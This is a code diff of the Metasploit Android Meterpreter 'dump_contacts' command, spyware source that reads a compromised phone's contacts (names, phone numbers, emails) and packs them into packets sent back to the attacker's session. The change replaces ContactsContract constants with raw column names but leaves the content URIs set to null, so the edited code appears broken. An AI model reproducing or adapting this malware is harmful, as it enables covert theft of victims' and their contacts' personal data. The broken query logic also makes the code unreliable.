@@ -2,8 +2,9 @@ package com.metasploit.meterpreter.android;
 
 import android.content.ContentResolver;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
-import android.provider.ContactsContract;
+//import android.provider.ContactsContract;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
@@ -26,7 +27,8 @@ public class dump_contacts_android implements Command {
 		
 		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ECLAIR) {
 			
-			Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+			Uri PhoneUri = null, EmailUri = null, ContactUri = null;
+			Cursor cur = cr.query(ContactUri, null, null, null, null);
 			
 			if (cur.getCount() > 0) {
 				
@@ -34,33 +36,34 @@ public class dump_contacts_android implements Command {
 					
 					TLVPacket pckt = new TLVPacket();
 					
-					String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+					String id = cur.getString(cur.getColumnIndex("_id"));
 					
 			        //String displayName = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
 	                pckt.addOverflow(TLV_TYPE_CONTACT_NAME, 
-	                		cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)));
+	                		cur.getString(cur.getColumnIndex("display_name")));
 			        
-		            Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-		                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
+	                
+		            Cursor pCur = cr.query(PhoneUri, null,
+		            		"contact_id" + " = ?", new String[] { id }, null);
 		            
 		            while (pCur.moveToNext()) {
 		                //String number = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 		                //String typeStr = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
 		                
 		                pckt.addOverflow(TLV_TYPE_CONTACT_NUMBER,
-		                		pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+		                		pCur.getString(pCur.getColumnIndex("data1")));
 		            }            
 		            pCur.close();
 	
-		            Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
-		            		ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[] { id }, null);
+		            Cursor emailCur = cr.query(EmailUri, null,
+		            		 "contact_id" + " = ?", new String[] { id }, null);
 		            
 	            	while (emailCur.moveToNext()) {
 	            		//String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
 	            		//String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
 	            		
 		                pckt.addOverflow(TLV_TYPE_CONTACT_EMAIL, 
-		                		emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)));	            		
+		                		emailCur.getString(emailCur.getColumnIndex("data1")));	            		
 	            	}	            	
 	            	emailCur.close();
 	            	
